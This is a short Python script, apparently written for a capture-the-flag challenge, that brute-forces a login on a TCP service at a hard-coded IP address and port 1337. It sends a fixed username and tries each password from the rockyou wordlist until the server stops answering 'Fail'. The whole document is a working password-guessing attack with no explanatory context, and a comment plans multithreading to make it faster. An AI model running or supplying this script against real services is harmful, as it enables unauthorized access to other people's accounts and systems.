import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    
    input_file = open(wordlist, "r")
    username = "v0idcache\n"
    for line in input_file:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        password = line
        data = s.recv(1024)
        s.send(username)
        data = s.recv(1024)
        s.send(password)
        data = s.recv(1024)
        
        if data != "Fail\n":
            print(password)
            break

#TODO: multithreading - faster

if __name__ == '__main__':
    brute_force()
